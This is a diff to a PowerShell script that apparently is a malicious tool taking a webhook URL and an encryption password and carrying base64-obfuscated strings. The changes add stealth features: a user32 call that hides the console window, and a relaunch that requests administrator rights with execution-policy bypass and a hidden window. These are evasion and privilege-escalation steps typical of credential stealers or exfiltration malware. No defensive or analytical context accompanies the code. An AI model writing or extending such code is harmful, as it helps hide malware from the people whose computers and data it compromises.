@@ -2,6 +2,11 @@ param([string]$WebhookURL,[string]$EncryptionPass,[switch]$Stealth)
 
 $VerboseMode = -not $Stealth
 function Write-Log { param([string]$Message); if ($VerboseMode) { Write-Host $Message } }
+if ($Stealth) {
+    Add-Type -Name W -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int s);' -Namespace N -ErrorAction SilentlyContinue
+    $h = (Get-Process -Id $pid).MainWindowHandle
+    if ($h -ne [IntPtr]::Zero) { [N.W]::ShowWindow($h, 0) }
+}
 
 $_x = "Nzg5MzQ5YzZjMmEwNmRhMGU3NDBlN2I0YjY5N2VhZjk0MWEvd2gudHh0"
 $_z = "NWQ5NGFhNTliN2E0YjRiMWI0NjkwOTgyZGU0YjExYjMvcmF3L2U3YWU1"
@@ -34,7 +39,9 @@ $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
 $principal = New-Object Security.Principal.WindowsPrincipal($identity)
 if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
     Write-Log "[*] Loading..."
-    $argList = [System.Collections.ArrayList]@("-NoP", "-EP", "Bypass", "-File", "`"$PSCommandPath`"")
+    $argList = [System.Collections.ArrayList]@("-NoP", "-EP", "Bypass")
+    if ($Stealth) { $null = $argList.Add("-WindowStyle"); $null = $argList.Add("Hidden") }
+    $null = $argList.Add("-File"); $null = $argList.Add("`"$PSCommandPath`"")
     if ($WebhookURL) { $null = $argList.Add("-WebhookURL"); $null = $argList.Add("`"$WebhookURL`"") }
     if ($EncryptionPass) { $null = $argList.Add("-EncryptionPass"); $null = $argList.Add("`"$EncryptionPass`"") }
     if ($Stealth) { $null = $argList.Add("-Stealth") }
